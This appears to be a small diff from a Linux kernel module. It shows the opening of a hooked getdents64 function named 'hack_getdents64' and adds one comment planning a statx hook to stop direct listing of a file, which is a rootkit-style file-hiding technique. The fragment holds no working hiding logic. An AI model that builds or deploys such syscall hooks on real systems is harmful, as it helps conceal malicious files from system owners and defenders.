@@ -7,6 +7,7 @@
     #include <linux/dirent.h>
     #include <linux/uaccess.h>// copy to/from user space
 
+// *statx hook is to be used to prevent direct listing of the file
 #ifdef PTREGS_SYSCALL_STUB
 static asmlinkage int hack_getdents64(const struct pt_regs *regs){
     // get the dirent pointer in user space from the register
